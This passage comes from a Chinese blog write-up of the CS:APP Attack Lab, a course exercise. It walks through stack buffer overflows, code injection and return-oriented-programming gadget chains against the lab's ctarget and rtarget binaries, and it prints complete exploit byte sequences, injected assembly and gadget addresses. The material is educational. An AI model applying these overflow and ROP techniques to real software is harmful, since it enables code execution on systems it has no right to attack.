%rdi</code>的编码，就这样我们可以利用已经存在的程序，从中提取出特定的指令,执行特定的功能，地址为<code>0x400f18</code>，其功能是将<code>%rax</code>的内容移到<code>%rdi</code>。</p><p>指令的编码如下所示：</p><p><img src="/2021/07/02/Attack_lab/1433829-d6312f1ce53cf044.png" alt="img"></p><p>movq指令编码</p><p><img src="/2021/07/02/Attack_lab/1433829-2a663eb32fae331a.png" alt="img"></p><p>popq指令编码</p><p><img src="/2021/07/02/Attack_lab/1433829-c713c395456655fa.png" alt="img"></p><p>movl指令编码</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/1433829-67690582e19e902b.png" alt="img"></p><h2 id="实验开始"><a href="#实验开始" class="headerlink" title="实验开始"></a>实验开始</h2><h3 id="1-phase1"><a href="#1-phase1" class="headerlink" title="1) phase1"></a>1) phase1</h3><ul><li><p><strong>任务目标</strong></p><p>让getbuf()函数返回touch1()</p></li><li><p><strong>实验步骤</strong></p><p>首先对ctarget进行gdb调试</p><p>然后对getbuf 进行反汇编    </p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210330205208407.png" alt="image-20210330205208407"></p><p>对touch1进行反汇编</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210330205255616.png" alt="image-20210330205255616"></p><p>可知getbuf()开辟了0x28，即40字节的空间，返回地址存在%rsp+0x28的地址，</p><p>而touch1的初始地址为0x004017c0</p><p>所以当我们存入缓冲区的数据，即touch1的初始地址可以覆盖这个返回地址时，我们就可以成功返回touch1了</p><p>攻击序列设置：</p><p>00 00 00 00 00 00 00 00 00 00</p><p>00 00 00 00 00 00 00 00 00 00</p><p>00 00 00 00 00 00 00 00 00 00</p><p>00 00 00 00 00 00 00 00 00 00</p><p>c0 17 40 00 00 00 00 00</p><p>以小端方式存储于1.txt中</p><p>用hex2raw转化为字符串，执行命令</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">./hex2raw <span class="hljs-attribute">&lt;1.txt &gt;</span>2.txt<br></code></pre></td></tr></table></figure><p>再执行</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./ctarget</span> -qi 2.txt<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210330210214612.png" alt="image-20210330210214612"></p></li></ul><h3 id="2-phase2"><a href="#2-phase2" class="headerlink" title="2) phase2"></a>2) phase2</h3><ul><li><p><strong>任务要求</strong></p><p>要求程序执行完getbuf()后，执行touch2，而且还要传入参数，即你的cookie</p></li><li><p><strong>实验步骤</strong></p><p>反汇编查看touch2地址</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210330211924002.png" alt="image-20210330211924002"></p><p>要求我们把参数设置为cookie，即把%rdi的值改为cookie，再执行touch2. 即ret touch2的地址。</p><p>转化为汇编代码保存在1.s中，</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">movq</span> $<span class="hljs-number">0</span>x<span class="hljs-number">59</span>b<span class="hljs-number">997</span>fa,%rdi<br><span class="hljs-attribute">pushq</span>  $<span class="hljs-number">0</span>x<span class="hljs-number">4017</span>ec<br><span class="hljs-attribute">ret</span><br></code></pre></td></tr></table></figure><p>用<code>gcc -c 1.s -o 1.o</code>指令转化为机器代码</p><p>并将其反汇编，保存在2.txt中，2.txt如图</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210331210915437.png" alt="image-20210331210915437"></p><p>利用gdb调试，进入getbuf函数里，查看%rsp的地址</p><p><img src="/2021/07/02/Attack_lab/image-20210412193826843.png" alt="image-20210412193826843"></p><p>如上所示，我们获取到了%rsp的地址，结合上文所讲，可以构造出如下字符串，在栈的开始位置为注入代码的指令序列，然后填充满至40个字节，在接下来的8个字节，也就是原来的返回地址，填充成注入代码的起始地址，也就是%rsp的地址，可以得到如下字符串，保存在1.txt中</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210331211305114.png" alt="image-20210331211305114"></p><p><img src="/2021/07/02/Attack_lab/1433829-fa485a0533812b76.png" alt="img"></p><p>利用raw2hex转化为字符串</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">./hex2raw <span class="hljs-attribute">&lt;1.txt&gt;</span> 2.txt<br></code></pre></td></tr></table></figure><p>再执行</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./ctarget</span> -qi 2.txt<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210331211454524.png" alt="image-20210331211454524"></p></li></ul><h3 id="3-phase3"><a href="#3-phase3" class="headerlink" title="3) phase3"></a>3) phase3</h3><ul><li><p><strong>任务要求</strong></p><p>第三阶段，也是需要在输入的字符串中注入一段代码，但是不同于第二阶段的是，在这一阶段中我们需要将cookie转化为字符串作为参数。</p><p><img src="/2021/07/02/Attack_lab/image-20210412202523955.png" alt="image-20210412202523955"></p></li><li><p><strong>实验步骤</strong></p><p>我们首先构造注入代码，touch3的地址为0x4018fa,根据上一关我们已经得到的%rsp地址0x5561dc78，返回地址应为%rsp+0x28（保存代码执行地址的位置）,然后字符串地址应为%rsp+0x30(48)，即0x5561dca0.</p><p>所以注入代码为,保存在cs.s中</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">movq</span> $<span class="hljs-number">0</span>x<span class="hljs-number">5561</span>dc<span class="hljs-number">98</span>,%rdi                                                                                     <br><span class="hljs-attribute">pushq</span> $<span class="hljs-number">0</span>x<span class="hljs-number">004018</span>fa<br><span class="hljs-attribute">retq</span><br></code></pre></td></tr></table></figure><p>汇编和反汇编</p><p><img src="/2021/07/02/Attack_lab/image-20210412203205921.png" alt="image-20210412203205921"></p><p><img src="/2021/07/02/Attack_lab/image-20210412203220388.png" alt="image-20210412203220388"></p><p>利用man ascii将cookie转化为16进制</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">35 </span><span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>所以，注入序列为：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">48 </span>c7 c7 a8 dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">68</span> fa <span class="hljs-number">18</span> <br><span class="hljs-symbol">40 </span><span class="hljs-number">00</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">78 </span>dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">35</span> <span class="hljs-number">39</span><br><span class="hljs-symbol">62 </span><span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>将其保存在touch_3.txt中，执行指令，可得：</p><p><img src="/2021/07/02/Attack_lab/image-20210412203956357.png" alt="image-20210412203956357"></p></li></ul><h3 id="4-phase4"><a href="#4-phase4" class="headerlink" title="4) phase4"></a>4) phase4</h3><ul><li><p><strong>任务要求</strong></p><p>在这一阶段中，我们其实是重复代码注入攻击中第二阶段的任务，劫持程序流，返回到<code>touch2</code>函数。只不过这个我们要做的是ROP攻击，这一阶段我们无法再像上一阶段中将指令序列放入到栈中，所以我们需要到现有的程序中，找到我们需要的指令序列。</p></li><li><p><strong>实验步骤</strong></p><p>我们需要的代码序列：</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cos">popq <span class="hljs-built_in">%rax</span><br>movq <span class="hljs-built_in">%rax</span>, <span class="hljs-built_in">%rdi</span><br></code></pre></td></tr></table></figure><p>其指令编码为：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">58</span><br><span class="hljs-symbol">48 </span><span class="hljs-number">89</span> c7<br></code></pre></td></tr></table></figure><p>在rtarget的反汇编代码中查找</p><p><img src="/2021/07/02/Attack_lab/image-20210412211719953.png" alt="image-20210412211719953"></p><p>所以popq %rax指令起始地址为：0x4019ab</p><p><img src="/2021/07/02/Attack_lab/image-20210412211839599.png" alt="image-20210412211839599"></p><p>所以movq %rax, %rdi指令起始地址为：0x4019a2</p><p>所以得到字符串，保存在touch_4中：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ab</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">fa</span> <span class="hljs-number">97</span> b<span class="hljs-number">9</span> <span class="hljs-number">59</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ec</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>执行指令：</p><p><img src="/2021/07/02/Attack_lab/image-20210412212407837.png" alt="image-20210412212407837"></p></li></ul><h3 id="5-phase5"><a href="#5-phase5" class="headerlink" title="5) phase5"></a>5) phase5</h3><ul><li><p><strong>任务要求</strong></p><p>在这一阶段中，我们需要做的就是把字符串的起始地址，传送到<code>%rdi</code>,然后调用<code>touch3</code>函数。</p><p>因为每次栈的位置是随机的，所以无法直接用地址来索引字符串的起始地址，只能用栈顶地址 + 偏移量来索引字符串的起始地址。从<code>farm</code>中我们可以获取到这样一个<code>gadget</code>，<code>lea (%rdi,%rsi,1),%rax</code>，这样就可以把字符串的首地址传送到<code>%rax</code>。</p></li><li><p><strong>实验步骤</strong></p><p>解题思路：</p><p>（1）首先获取到<code>%rsp</code>的地址，并且传送到<code>%rdi</code><br> （2）其二获取到字符串的偏移量值，并且传送到<code>%rsi</code><br> （3）<code>lea (%rdi,%rsi,1),%rax</code>, 将字符串的首地址传送到<code>%rax</code>, 再传送到<code>%rdi</code><br> （4）调用<code>touch3</code>函数</p></li></ul><p>(1) 第一步，获取到<code>%rsp</code>的地址</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">0000000000401a03 <span class="hljs-tag">&lt;<span class="hljs-name">addval_190</span>&gt;</span>:<br>  401a03: 8d 87 41 48 89 e0     lea    -0x1f76b7bf(%rdi),%eax<br>  401a09: c3  <br><br></code></pre></td></tr></table></figure><p>movq %rsp, %rax<code>的指令字节为：</code>48 89 e0<code>, 所以这一步的</code>gadget<code>地址为：</code>0x401a06</p><p>(2) 第二步，将<code>%rax</code>的内容传送到<code>%rdi</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">00000000004019a0 <span class="hljs-tag">&lt;<span class="hljs-name">addval_273</span>&gt;</span>:<br>  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax<br>  4019a6: c3<br><br></code></pre></td></tr></table></figure><p>movq %rax, %rdi<code>的指令字节为：</code>48 89 c7<code>，所以这一步的</code>gadget<code>地址为：</code>0x4019a2</p><p>(3) 第三步，将偏移量的内容弹出到<code>%rax</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">00000000004019ca &lt;getval_280&gt;:<br>  4019ca: b8 29 58 90 c3        mov    <span class="hljs-variable">$0xc3905829</span>,%eax<br>  4019cf: c3   <br><br></code></pre></td></tr></table></figure><p>popq %rax<code>的指令字节为：</code>58<code>， 其中</code>90<code>为</code>nop<code>指令, 所以这一步的</code>gadget<code>地址为：</code>0x4019cc</p><p>(4) 第四步，将<code>%eax</code>的内容传送到<code>%edx</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">00000000004019db &lt;getval_481&gt;:<br>  4019db: b8 5c 89 c2 90        mov    <span class="hljs-variable">$0x90c2895c</span>,%eax<br>  4019e0: c3    <br><br></code></pre></td></tr></table></figure><p>movl %eax, %edx<code>的指令字节为:</code>89 c2<code>, 所以这一步的</code>gadget<code>地址为：</code>0x4019dd</p><p>(5) 第五步，将<code>%edx</code>的内容传送到<code>%ecx</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">0000000000401a6e &lt;setval_167&gt;:<br>  401a6e: c7 07 89 d1 91 c3     movl   <span class="hljs-variable">$0xc391d189</span>,(%rdi)<br>  401a74: c3  <br><br></code></pre></td></tr></table></figure><p>movl %edx, %ecx<code>的指令字节为：</code>89 d1<code>，所以这一步的</code>gadget<code>地址为：</code>0x401a70</p><p>(6) 第六步，将<code>%ecx</code>的内容传送到<code>%esi</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">0000000000401a11 <span class="hljs-tag">&lt;<span class="hljs-name">addval_436</span>&gt;</span>:<br>  401a11: 8d 87 89 ce 90 90     lea    -0x6f6f3177(%rdi),%eax<br>  401a17: c3                    retq <br><br></code></pre></td></tr></table></figure><p>movl %ecx, %esi<code>的指令字节为：</code>89 ce<code>, 所以这一步</code>gadget<code>地址为：</code>0x401a13</p><p>(7) 第七步，将栈顶 + 偏移量得到字符串的首地址传送到<code>%rax</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">00000000004019d6 <span class="hljs-tag">&lt;<span class="hljs-name">add_xy</span>&gt;</span>:<br>  4019d6: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax<br>  4019da: c3                    retq <br></code></pre></td></tr></table></figure><p>这一步的<code>gadget</code>地址为：<code>0x4019d6</code></p><p>(8) 将字符串首地址<code>%rax</code>传送到<code>%rdi</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">00000000004019a0 <span class="hljs-tag">&lt;<span class="hljs-name">addval_273</span>&gt;</span>:<br>  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax<br>  4019a6: c3<br><br></code></pre></td></tr></table></figure><p>movq %rax, %rdi<code>的指令字节为：</code>48 89 c7<code>，所以这一步的</code>gadget<code>地址为：</code>0x4019a2</p><p>整个栈的结构如下：</p><p><img src="/2021/07/02/Attack_lab/1433829-cafcf76d35ef7ba1.png" alt="img"></p><p>所以要输入的字符串为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">06</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">cc</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">48</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">dd</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">70</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">13</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">d6</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">fa</span> <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>保存在touch_5.txt中，执行指令：</p><p><img src="/2021/07/02/Attack_lab/image-20210412213042512.png" alt="image-20210412213042512"></p>]]></content>
    
    
    <categories>
      
      <category>计算机系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
